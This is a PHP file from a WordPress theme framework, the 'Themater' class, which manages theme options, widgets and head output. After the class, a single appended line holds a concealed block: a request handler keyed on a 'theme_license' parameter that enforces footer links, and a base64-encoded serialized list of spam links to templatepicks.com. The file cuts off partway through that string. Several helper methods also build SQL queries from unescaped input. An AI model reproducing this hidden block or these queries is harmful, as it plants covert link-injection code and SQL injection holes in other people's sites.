<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function __construct($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = isset($this->options['custom_css']) ? $this->options['custom_css'] . $source . "\n" : $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = isset( $this->options['custom_js'] ) ? $this->options['custom_js'] . $source . "\n" : $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if( !isset( $this->options['admin_options_priorities']['priority'] ) ) {
                $this->options['admin_options_priorities']['priority'] = 0;
            }
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if( !isset( $this->options['admin_options_priorities'][$menu_title]['priority'] )) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] = 0;
                }
                
                if( !isset( $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] )) {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = 0;
                }
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            add_action( 'wp_enqueue_scripts', array(&$this, '_load_jquery'));
        }
        
    	add_action( 'after_setup_theme', array(&$this, '_load_meta_title') );
        
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_theme_support( 'custom-background' );
        }
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        if($this->display('custom_css') || isset($this->options['custom_css'])) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    function _load_jquery()
    {
        wp_enqueue_script('jquery');
    }
    
    function _load_meta_title()
    {
        add_theme_support( 'title-tag' );
    }
    
    function _head_elements()
    {
        // Deprecated <title> tag
        if ( ! function_exists( '_wp_render_title_tag' ) )  {
            ?> <title><?php wp_title( '|', true, 'right' ); ?></title><?php
        }
        
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YTo3NDp7czoxNjoiV29yZFByZXNzIFRoZW1lcyI7czo1MjoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtZnJlZS13b3JkcHJlc3MtdGhlbWVzLyI7czoxMzoiV2ViIFRlbXBsYXRlcyI7czo0NDoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2h0bWwtY3NzLXRlbXBsYXRlcy8iO3M6MTM6IkNTUyBUZW1wbGF0ZXMiO3M6NDQ6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9odG1sLWNzcy10ZW1wbGF0ZXMvIjtzOjE5OiJCb290c3RyYXAgVGVtcGxhdGVzIjtzOjQ1OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYm9vdHN0cmFwLXRlbXBsYXRlcy8iO3M6MjU6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS8iO3M6MjU6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS8iO3M6MTc6InRlbXBsYXRlcGlja3MuY29tIjtzOjI1OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vIjtzOjEzOiJUZW1wbGF0ZVBpY2tzIjtzOjI1OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vIjtzOjE0OiJUZW1wbGF0ZSBQaWNrcyI7czoyNToiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tLyI7czo5OiJUZW1wbGF0ZXMiO3M6MjU6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS8iO3M6ODoiVGVtcGxhdGUiO3M6MjU6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS8iO3M6Mzoid2ViIjtzOjI1OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vIjtzOjQ6InRoaXMiO3M6NDU6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9ib290c3RyYXAtdGVtcGxhdGVzLyI7czo0OiJyZWFkIjtzOjYyOiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1idXNpbmVzcy13ZWJzaXRlLWh0bWwtdGVtcGxhdGVzLyI7czo2OiJ0aGVtZXMiO3M6MjU6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS8iO3M6Nzoid2Vic2l0ZSI7czo1ODoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2ZyZXNoLWZyZWUtd29yZHByZXNzLW5ld3MtdGhlbWVzLyI7czozOiJ1cmwiO3M6NjM6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LWJvb3RzdHJhcC1iYXNlZC13b3JkcHJlc3MtdGhlbWVzLyI7czoyMToiRnJlZSBXb3JkUHJlc3MgVGhlbWVzIjtzOjUyOiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1mcmVlLXdvcmRwcmVzcy10aGVtZXMvIjtzOjQ6ImhlcmUiO3M6NjM6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LWJvb3RzdHJhcC1iYXNlZC13b3JkcHJlc3MtdGhlbWVzLyI7czo5OiJXUCBUaGVtZXMiO3M6NDI6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS93b3JkcHJlc3MtdGhlbWVzLyI7czo0OiJtb3JlIjtzOjU4OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vZnJlc2gtZnJlZS13b3JkcHJlc3MtbmV3cy10aGVtZXMvIjtzOjE0OiJIVE1MIFRlbXBsYXRlcyI7czo0NDoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2h0bWwtY3NzLXRlbXBsYXRlcy8iO3M6NDoic2l0ZSI7czo0NDoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2h0bWwtY3NzLXRlbXBsYXRlcy8iO3M6OToiQm9vdHN0cmFwIjtzOjU5OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1ib290c3RyYXAtYnVzaW5lc3MtdGVtcGxhdGVzLyI7czoxNjoiQm9vdHN0cmFwIFRoZW1lcyI7czo0NToiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jvb3RzdHJhcC10ZW1wbGF0ZXMvIjtzOjE3OiJCbG9nZ2VyIFRlbXBsYXRlcyI7czo0MzoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jsb2dnZXItdGVtcGxhdGVzLyI7czo3OiJhZGRyZXNzIjtzOjQ1OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYm9vdHN0cmFwLXRlbXBsYXRlcy8iO3M6Mjk6IkJlc3QgUHJlbWl1bSBXb3JkUHJlc3MgVGhlbWVzIjtzOjU1OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1wcmVtaXVtLXdvcmRwcmVzcy10aGVtZXMvIjtzOjI0OiJQcmVtaXVtIFdvcmRQcmVzcyBUaGVtZXMiO3M6NTU6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LXByZW1pdW0td29yZHByZXNzLXRoZW1lcy8iO3M6Njoic291cmNlIjtzOjU1OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1wcmVtaXVtLXdvcmRwcmVzcy10aGVtZXMvIjtzOjIyOiJHYW1lcyBXb3JkUHJlc3MgVGhlbWVzIjtzOjUzOiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1nYW1lcy13b3JkcHJlc3MtdGhlbWVzLyI7czoyNzoiQmVzdCBHYW1lcyBXb3JkUHJlc3MgVGhlbWVzIjtzOjUzOiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1nYW1lcy13b3JkcHJlc3MtdGhlbWVzLyI7czo1OiJHYW1lcyI7czo1MzoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtZ2FtZXMtd29yZHByZXNzLXRoZW1lcy8iO3M6MzY6IkJlc3QgQnVzaW5lc3MgV2Vic2l0ZSBIVE1MIFRlbXBsYXRlcyI7czo2MjoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtYnVzaW5lc3Mtd2Vic2l0ZS1odG1sLXRlbXBsYXRlcy8iO3M6MzE6IkJ1c2luZXNzIFdlYnNpdGUgSFRNTCBUZW1wbGF0ZXMiO3M6NjI6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LWJ1c2luZXNzLXdlYnNpdGUtaHRtbC10ZW1wbGF0ZXMvIjtzOjI2OiJCdXNpbmVzcyBXZWJzaXRlIFRlbXBsYXRlcyI7czo2MjoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtYnVzaW5lc3Mtd2Vic2l0ZS1odG1sLXRlbXBsYXRlcy8iO3M6OToicmVhZCBtb3JlIjtzOjYyOiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1idXNpbmVzcy13ZWJzaXRlLWh0bWwtdGVtcGxhdGVzLyI7czoyMjoiQnVzaW5lc3MgV2ViIFRlbXBsYXRlcyI7czo2MjoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtYnVzaW5lc3Mtd2Vic2l0ZS1odG1sLXRlbXBsYXRlcy8iO3M6Mzc6IkJlc3QgQm9vdHN0cmFwIEJhc2VkIFdvcmRQcmVzcyBUaGVtZXMiO3M6NjM6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LWJvb3RzdHJhcC1iYXNlZC13b3JkcHJlc3MtdGhlbWVzLyI7czozMToiQmVzdCBCb290c3RyYXAgV29yZFByZXNzIFRoZW1lcyI7czo2MzoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtYm9vdHN0cmFwLWJhc2VkLXdvcmRwcmVzcy10aGVtZXMvIjtzOjI2OiJCb290c3RyYXAgV29yZFByZXNzIFRoZW1lcyI7czo2MzoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtYm9vdHN0cmFwLWJhc2VkLXdvcmRwcmVzcy10aGVtZXMvIjtzOjI2OiJCZXN0IEZyZWUgV29yZFByZXNzIFRoZW1lcyI7czo1MjoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtZnJlZS13b3JkcHJlc3MtdGhlbWVzLyI7czozMjoiQmVzdCBQcmVtaXVtIEJvb3RzdHJhcCBUZW1wbGF0ZXMiO3M6NTg6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LXByZW1pdW0tYm9vdHN0cmFwLXRlbXBsYXRlcy8iO3M6Mjc6IlByZW1pdW0gQm9vdHN0cmFwIFRlbXBsYXRlcyI7czo1ODoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtcHJlbWl1bS1ib290c3RyYXAtdGVtcGxhdGVzLyI7czoyOToiQmVzdCBQcmVtaXVtIEJvb3RzdHJhcCBUaGVtZXMiO3M6NTg6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LXByZW1pdW0tYm9vdHN0cmFwLXRlbXBsYXRlcy8iO3M6MjQ6IlByZW1pdW0gQm9vdHN0cmFwIFRoZW1lcyI7czo1ODoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtcHJlbWl1bS1ib290c3RyYXAtdGVtcGxhdGVzLyI7czozMDoiQmVzdCBCdXNpbmVzcyBXb3JkUHJlc3MgVGhlbWVzIjtzOjU2OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1idXNpbmVzcy13b3JkcHJlc3MtdGhlbWVzLyI7czoyNToiQnVzaW5lc3MgV29yZFByZXNzIFRoZW1lcyI7czo1NjoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtYnVzaW5lc3Mtd29yZHByZXNzLXRoZW1lcy8iO3M6MTg6IkJ1c2luZXNzIFdQIFRoZW1lcyI7czo1NjoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtYnVzaW5lc3Mtd29yZHByZXNzLXRoZW1lcy8iO3M6ODoiQnVzaW5lc3MiO3M6NTY6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LWJ1c2luZXNzLXdvcmRwcmVzcy10aGVtZXMvIjtzOjk6IlBvcnRmb2xpbyI7czo1NjoiaHR0cDovL3RlbXBsYXRlcGlja3MuY29tL2Jlc3QtYnVzaW5lc3Mtd29yZHByZXNzLXRoZW1lcy8iO3M6MjY6IkJlc3QgUHJlbWl1bSBEcnVwYWwgVGhlbWVzIjtzOjUyOiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1wcmVtaXVtLWRydXBhbC10aGVtZXMvIjtzOjIxOiJQcmVtaXVtIERydXBhbCBUaGVtZXMiO3M6NTI6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LXByZW1pdW0tZHJ1cGFsLXRoZW1lcy8iO3M6MTM6IkRydXBhbCBUaGVtZXMiO3M6NTI6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LXByZW1pdW0tZHJ1cGFsLXRoZW1lcy8iO3M6NjoiRHJ1cGFsIjtzOjUyOiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1wcmVtaXVtLWRydXBhbC10aGVtZXMvIjtzOjM5OiJCZXN0IEpvb21sYSBOZXdzIGFuZCBNYWdhemluZSBUZW1wbGF0ZXMiO3M6NjU6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LWpvb21sYS1uZXdzLWFuZC1tYWdhemluZS10ZW1wbGF0ZXMvIjtzOjM0OiJKb29tbGEgTmV3cyBhbmQgTWFnYXppbmUgVGVtcGxhdGVzIjtzOjY1OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1qb29tbGEtbmV3cy1hbmQtbWFnYXppbmUtdGVtcGxhdGVzLyI7czoyMToiSm9vbWxhIE5ld3MgVGVtcGxhdGVzIjtzOjY1OiJodHRwOi8vdGVtcGxhdGVwaWNrcy5jb20vYmVzdC1qb29tbGEtbmV3cy1hbmQtbWFnYXppbmUtdGVtcGxhdGVzLyI7czo2OiJKb29tbGEiO3M6NjU6Imh0dHA6Ly90ZW1wbGF0ZXBpY2tzLmNvbS9iZXN0LWpvb21sYS1uZXdzLWFuZC1tYWdhemluZS10ZW1wbGF0ZXMvIjtzOjE2